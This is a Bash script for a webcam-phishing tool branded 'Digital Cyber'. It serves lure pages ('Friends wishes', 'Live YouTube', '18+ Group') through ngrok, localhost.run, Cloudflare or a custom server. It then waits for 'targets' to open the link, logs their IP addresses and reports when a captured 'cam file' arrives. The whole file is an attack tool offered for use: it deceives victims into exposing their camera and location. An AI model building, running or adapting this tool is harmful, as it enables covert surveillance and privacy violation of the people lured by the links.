#!/bin/bash

trap 'printf "\n";stop' 2

banner() {
clear
echo -e "\e[1;31m██████╗  ██████╗ ████████╗██╗      \e[1;36m ██████╗ █████╗ ███╗   ███╗\e[0m"
echo -e "\e[1;33m██╔══██╗██╔════╝ ╚══██╔══╝██║      \e[1;34m██╔════╝██╔══██╗████╗ ████║\e[0m"
echo -e "\e[1;32m██║  ██║██║  ███╗   ██║   ██║      \e[1;32m██║     ███████║██╔████╔██║\e[0m"
echo -e "\e[1;36m██║  ██║██║   ██║   ██║   ██║      \e[1;35m██║     ██╔══██║██║╚██╔╝██║\e[0m"
echo -e "\e[1;34m██████╔╝╚██████╔╝   ██║   ███████╗ \e[1;33m╚██████╗██║  ██║██║ ╚═╝ ██║\e[0m"
echo -e "\e[1;35m╚═════╝  ╚═════╝    ╚═╝   ╚══════╝ \e[1;31m ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝\e[0m"

echo -e "\e[1;34m  <========================================================>\e[0m\n"
echo -e "\e[1;92m         WELCOME To Webcam\e[1;97m => \e[1;96mCreate by Digital Cyber          \e[0m\n"
echo -e "\e[1;92m  <========================================================>\e[0m"
echo -e "\e[1;91m     YouTube Bangla\e[1;90m => \e[1;93m https://www.youtube.com/@DigitalCyber-c5n\e[0m"
echo -e "\e[1;92m  <========================================================>\e[0m"
echo -e "\e[1;95m          Subscribe my YouTube Channel DigitalCyber-c5n\e[0m"
echo -e "\e[1;34m  <========================================================>\e[0m\n"
}


dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 


}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}

Master() {

command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Server...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

ssh -R 80:localhost:3333 nokey@localhost.run  2> /dev/null > sendlink &

sleep 8

printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server...\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3

send_link=$(grep -o "https://[0-9a-z]*\.lhr.life" sendlink)

printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
ssh_server
checkfound
}


Ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
sed 's+forwarding_link+'$link'+g' check.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' wish.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index.html
elif [[ $option_tem -eq 2 ]]; then
sed 's+forwarding_link+'$link'+g' YouTube.html > index3.html
sed 's+live_yt_tv+'$yt_video_url'+g' index3.html > index.html
else
sed 's+forwarding_link+'$link'+g' Xindex.html > index.html
fi
rm -rf index3.html

}

select_template() {
    if [[ $option_server -gt 3 || $option_server -lt 0 ]]; then
        printf "\e[1;93m [!] Invalid tunnel option! Try again.\e[0m\n"
        sleep 1
        clear
        banner
        masterphish
    else
        printf "\n----- Choose a template ----\n"
        printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Friends wishes\e[0m\n"
        printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live YouTube\e[0m\n"
        printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m 18+ Group\e[0m\n"

        default_option_template="2"
        read -p $'\n\e[1;92m[+] Choose an option Number\e[1;93m[Default YouTube]: \e[0m' option_tem
        option_tem="${option_tem:-${default_option_template}}"

        if [[ $option_tem -eq 1 ]]; then
            read -p $'\n\e[1;92m[+] Enter festival name: \e[0m' fest_name
            fest_name="${fest_name//[[:space:]]/}"

        elif [[ $option_tem -eq 2 ]]; then
            read -p $'\n\e[1;92m[+] Enter YouTube Video link: \e[0m' yt_video_url

        elif [[ $option_tem -eq 3 ]]; then
            echo -e "\e[1;92m[✔] 18+ Group Selected.\e[0m"

        else
            printf "\e[1;93m [!] Invalid template option! Try again.\e[0m\n"
            sleep 1
            select_template
        fi
    fi
}


ngrok_server() {
    if command -v ngrok &> /dev/null; then
        echo ""
    else
        echo "Installing Ngrok..."
        pkg install -y wget unzip
        wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip -O ngrok.zip
        unzip ngrok.zip
        mv ngrok $PREFIX/bin/
        rm ngrok.zip
        echo "Ngrok installation complete."
    fi

    # Check if Ngrok token is already set
    fuser -k 3333/tcp > /dev/null 2>&1
    php -S localhost:3333 > /dev/null 2>&1 &
    ngrok tcp 3333 > /dev/null 2>&1 &

    sleep 10
	#!/bin/bash

 TUNNEL_DATA=$(curl -s http://localhost:4040/api/tunnels)

if echo "$TUNNEL_DATA" | jq -e '.tunnels[] | select(.proto == "http")' > /dev/null; then
    URL=$(echo "$TUNNEL_DATA" | jq -r '.tunnels[] | select(.proto == "http") | .public_url')
    echo "🟢 HTTP URL: $URL"
else
    TCP_URL=$(echo "$TUNNEL_DATA" | jq -r '.tunnels[] | select(.proto == "tcp") | .public_url')
    HTTP_STYLE_URL=$(echo "$TCP_URL" | sed 's/tcp:/http:/')
    echo -e "\e[1;92m[+] Ngrok Link:\e[0m\e[1;77m \e[0m"$HTTP_STYLE_URL
    fi
Ngrok
checkfound
}

cloudflare_tunnel() {
rm -f cf_tunnel.log

if command -v cloudflared &> /dev/null
then
    echo ""
else
    echo "Installing Cloudflared..."
    pkg update -y
    pkg install -y cloudflared

    echo "Cloudflared installation complete."
fi

printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server...\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
cloudflared tunnel --url http://localhost:3333 --no-autoupdate > cf_tunnel.log 2>&1 &

sleep 10
link=$(grep -o 'https://[^ ]*\.trycloudflare.com' cf_tunnel.log | head -n 1)

if [[ -z "$link" ]]; then
    printf "\e[1;31m[!] Cloudflare Tunnel Failed, Check Your Internet!\e[0m\n"
    exit 1
else
    printf "\e[1;92m[+] Cloudflare Link:\e[0m \e[1;77m%s\e[0m\n" $link
fi
cl_server
checkfound
}

masterphish() {
    if [[ -e send_link ]]; then
        rm -rf send_link
    fi

    printf "\n----- Choose tunnel server -----\n"
    printf "\n\e[1;92m[\e[1;96m00\e[1;92m]\e[0m\e[1;93m Custom Server\e[0m\n"
    printf "\e[1;92m[\e[1;96m01\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
    printf "\e[1;92m[\e[1;96m02\e[1;92m]\e[0m\e[1;93m Server SSH\e[0m\n"
    printf "\e[1;92m[\e[1;96m03\e[1;92m]\e[0m\e[1;93m Cloudflare \e[0m\n"

    default_option_server="0"
    read -p $'\n\e[1;92m[+] Choose a Port Forwarding option:\e[1;93m[Default is 00] \e[0m' option_server
    option_server="${option_server:-${default_option_server}}"
    
    select_template

    if [[ "$option_server" == "0" || "$option_server" == "00" ]]; then
    custom_server

    elif [[ "$option_server" == "1" || "$option_server" == "01" ]]; then
        ngrok_server

    elif [[ "$option_server" == "2" || "$option_server" == "02" ]]; then
        Master

    elif [[ "$option_server" == "3" || "$option_server" == "03" ]]; then
        cloudflare_tunnel

    else
        echo -e "\e[1;93m[!] Invalid option!\e[0m"
        sleep 1
        clear
        masterphish
    fi
}

custom_server() {
echo -e "\n\e[1;95m[+] Default port 8080 \e[0m"
read -p $'\n\e[1;92m[+] Enter your Custom (http&https://example.com): \e[0m' send_link

php -S php -S localhost:8080 > /dev/null 2>&1 &

sed 's+forwarding_link+'$send_link'+g' check.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' wish.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index.html
elif [[ $option_tem -eq 2 ]]; then
sed 's+forwarding_link+'$link'+g' YouTube.html > index3.html
sed 's+live_yt_tv+'$yt_video_url'+g' index3.html > index.html
else
sed 's+forwarding_link+'$link'+g' Xindex.html > index3.html
sed 's+live_yt_tv+'$yt_video_url'+g' index3.html > index.html
fi
rm -rf index3.html

printf "\n\e[1;92m[+] Custom Server Hosted Successfully:\e[1;93m $send_link\e[0m\n"
checkfound
}

ssh_server() {

link=$(grep -o "https://[0-9a-z]*\.lhr.life" sendlink)
sed 's+forwarding_link+'$send_link'+g' check.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' wish.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index.html
elif [[ $option_tem -eq 2 ]]; then
sed 's+forwarding_link+'$link'+g' YouTube.html > index3.html
sed 's+live_yt_tv+'$yt_video_url'+g' index3.html > index.html
else
sed 's+forwarding_link+'$link'+g' Xindex.html > index3.html
sed 's+live_yt_tv+'$yt_video_url'+g' index3.html > index.html
fi
rm -rf index3.html
checkfound
}

cl_server() {

link=$(grep -o 'https://[^ ]*\.trycloudflare.com' cf_tunnel.log | head -n 1)
sed 's+forwarding_link+'$send_link'+g' check.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' wish.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index.html
elif [[ $option_tem -eq 2 ]]; then
sed 's+forwarding_link+'$link'+g' YouTube.html > index3.html
sed 's+live_yt_tv+'$yt_video_url'+g' index3.html > index.html
else
sed 's+forwarding_link+'$link'+g' Xindex.html > index3.html
sed 's+live_yt_tv+'$yt_video_url'+g' index3.html > index.html
fi
rm -rf index3.html
checkfound
}

banner
dependencies
masterphish
